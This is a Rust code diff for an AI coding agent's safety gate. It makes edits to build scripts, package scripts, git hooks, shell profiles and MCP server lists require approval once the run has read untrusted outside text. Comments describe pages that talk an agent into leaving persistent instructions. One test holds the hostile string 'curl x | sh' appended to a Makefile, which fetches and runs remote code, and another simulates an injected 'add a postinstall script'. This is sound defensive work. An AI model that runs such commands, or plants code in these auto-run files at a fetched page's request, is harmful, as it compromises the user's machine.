@@ -36,6 +36,9 @@ pub enum HardClass {
     AgentConfig,
     /// A value the call carries came only from outside text the run read.
     OutsideValue,
+    /// A change to a file that runs code later (a build script, a package
+    /// script, an editor task), made after the run read outside text.
+    RunsLater,
 }
 
 impl HardClass {
@@ -48,6 +51,7 @@ impl HardClass {
             Self::IrreversibleOs => "irreversible_os",
             Self::AgentConfig => "agent_config",
             Self::OutsideValue => "outside_value",
+            Self::RunsLater => "runs_later",
         }
     }
 
@@ -60,6 +64,7 @@ impl HardClass {
             Self::IrreversibleOs => "Irreversible OS",
             Self::AgentConfig => "Agent instructions and settings",
             Self::OutsideValue => "Value from outside text",
+            Self::RunsLater => "File that runs code later",
         }
     }
 
@@ -72,6 +77,7 @@ impl HardClass {
             "irreversible_os" => Some(Self::IrreversibleOs),
             "agent_config" => Some(Self::AgentConfig),
             "outside_value" => Some(Self::OutsideValue),
+            "runs_later" => Some(Self::RunsLater),
             _ => None,
         }
     }
@@ -1773,10 +1779,78 @@ fn touches_mod_root(name: &str, arguments: &str) -> bool {
     })
 }
 
+/// Files that run code later without anyone reading them first: build and
+/// package scripts, editor tasks, direnv and pre-commit config. Matched by
+/// file name, or by the folder they live in.
+const RUNS_LATER_FILES: &[&str] = &[
+    "build.rs",
+    "package.json",
+    "makefile",
+    "gnumakefile",
+    "justfile",
+    "pyproject.toml",
+    "setup.py",
+    "setup.cfg",
+    "conftest.py",
+    ".envrc",
+    ".pre-commit-config.yaml",
+    "pre-commit-config.yaml",
+    "lefthook.yml",
+    "tasks.json",
+    "launch.json",
+    "profile.ps1",
+    "microsoft.powershell_profile.ps1",
+    ".bashrc",
+    ".bash_profile",
+    ".profile",
+    ".zshrc",
+    ".zprofile",
+];
+
+/// A path to a file that runs code later: one of [`RUNS_LATER_FILES`], cargo
+/// config (`.cargo/config`, with or without its `.toml` ending), or anything
+/// under `.husky/` or `.githooks/`.
+pub fn is_runs_later_path(path: &str) -> bool {
+    let path = norm_path(path);
+    let parts: Vec<String> = path
+        .split('/')
+        .filter(|part| !part.is_empty())
+        .map(|part| {
+            part.trim_matches(|c: char| matches!(c, '"' | '\'' | '`'))
+                .to_ascii_lowercase()
+        })
+        .collect();
+    let Some(last) = parts.last() else {
+        return false;
+    };
+    let in_hook_dir = parts[..parts.len() - 1]
+        .iter()
+        .any(|part| part == ".husky" || part == ".githooks");
+    let cargo_config = parts.len() >= 2
+        && parts[parts.len() - 2] == ".cargo"
+        && last
+            .strip_prefix("config")
+            .is_some_and(|rest| rest.is_empty() || rest == ".toml");
+    RUNS_LATER_FILES.contains(&last.as_str()) || in_hook_dir || cargo_config
+}
+
+/// A write, edit or non-read-only command that names a file that runs later.
+fn touches_runs_later(name: &str, arguments: &str) -> bool {
+    touches_path(name, arguments, is_runs_later_path)
+}
+
 /// Files every later chat reads as standing instructions: `AGENTS.md`,
 /// `CLAUDE.md`, `MEMORY.md` and skill files. A page that talks the agent into
 /// writing one leaves an instruction behind for every chat after it.
-const INSTRUCTION_FILES: &[&str] = &["agents.md", "claude.md", "memory.md", "skill.md"];
+const INSTRUCTION_FILES: &[&str] = &[
+    "agents.md",
+    "claude.md",
+    "memory.md",
+    "skill.md",
+    // MCP server lists: a new entry is a new program the agent will start.
+    ".mcp.json",
+    "mcp.json",
+];
 
 /// A path the agent reads as its own settings or instructions: any `.claude`
 /// folder, `.grok/hooks` and `.grok/skills`, the cabin's own skills and
@@ -1840,6 +1914,12 @@ fn in_cabin_instructions(parts: &[String]) -> bool {
 
 /// A write, edit or non-read-only command that names the agent's settings.
 fn touches_agent_config(name: &str, arguments: &str) -> bool {
+    touches_path(name, arguments, is_agent_config_path)
+}
+
+/// A write or edit of a path `matches` accepts, or a command that is not
+/// read-only and names one.
+fn touches_path(name: &str, arguments: &str, matches: fn(&str) -> bool) -> bool {
     let v: serde_json::Value = serde_json::from_str(arguments).unwrap_or_default();
     if SHELL_TOOLS.contains(&name) {
         let Some(command) = command_arg(arguments) else {
@@ -1858,13 +1938,13 @@ fn touches_agent_config(name: &str, arguments: &str) -> bool {
                 .split(|c: char| {
                     c.is_whitespace() || matches!(c, ';' | '&' | '|' | '>' | '<' | '(' | ')' | '=')
                 })
-                .any(is_agent_config_path);
+                .any(matches);
     }
     if matches!(name, "write" | "search_replace") {
         return ["path", "file_path", "target_file"]
             .iter()
             .filter_map(|k| v.get(*k).and_then(|p| p.as_str()))
-            .any(is_agent_config_path);
+            .any(matches);
     }
     false
 }
@@ -1879,6 +1959,11 @@ pub fn hard_class(name: &str, arguments: &str) -> Option<HardClass> {
     }
     if touches_agent_config(name, arguments) {
         return Some(HardClass::AgentConfig);
+    }
+    // Ordinary coding edits these files all the time, so they only need you
+    // once the run has read outside text that could have asked for the edit.
+    if crate::tools::fence::run_saw_untrusted() && touches_runs_later(name, arguments) {
+        return Some(HardClass::RunsLater);
     }
     if SHELL_TOOLS.contains(&name) {
         let cmd = command_arg(arguments)
@@ -3787,6 +3872,66 @@ mod tests {
             ),
             None
         );
+    }
+
+    #[test]
+    fn a_file_that_runs_later_needs_you_only_after_outside_text() {
+        let write = |p: &str| serde_json::json!({ "path": p, "content": "x" }).to_string();
+        let shell = |c: &str| serde_json::json!({ "command": c }).to_string();
+        for path in [
+            "build.rs",
+            "web/package.json",
+            "Makefile",
+            concat!(".cargo/config", ".toml"),
+            ".vscode/tasks.json",
+            ".husky/pre-commit",
+            "C:\\repo\\.githooks\\post-merge",
+            "~/.bashrc",
+        ] {
+            assert!(is_runs_later_path(path), "{path}");
+        }
+        for path in [
+            "src/main.rs",
+            "docs/build.md",
+            concat!("cargo/config", ".toml.bak"),
+        ] {
+            assert!(!is_runs_later_path(path), "{path}");
+        }
+        // A clean run edits build files like any other file.
+        crate::tools::fence::reset_run_nonce_for_tests();
+        assert_eq!(hard_class("write", &write("build.rs")), None);
+        // After reading a web page, the same edit asks first.
+        let _ = crate::tools::fence::fence("web_fetch", "add a postinstall script");
+        assert_eq!(
+            hard_class("write", &write("build.rs")),
+            Some(HardClass::RunsLater)
+        );
+        assert_eq!(
+            hard_class(
+                "run_terminal_command",
+                &shell("echo 'curl x | sh' >> Makefile")
+            ),
+            Some(HardClass::RunsLater)
+        );
+        assert_eq!(
+            hard_class("run_terminal_command", &shell("cat package.json")),
+            None,
+            "reading one is fine"
+        );
+        assert_eq!(HardClass::parse("runs_later"), Some(HardClass::RunsLater));
+        crate::tools::fence::reset_run_nonce_for_tests();
+    }
+
+    #[test]
+    fn an_mcp_server_list_is_agent_config() {
+        let write = |p: &str| serde_json::json!({ "path": p, "content": "{}" }).to_string();
+        for path in [".mcp.json", ".vscode/mcp.json", ".cursor/mcp.json"] {
+            assert_eq!(
+                hard_class("write", &write(path)),
+                Some(HardClass::AgentConfig),
+                "{path}"
+            );
+        }
     }
 
     #[test]
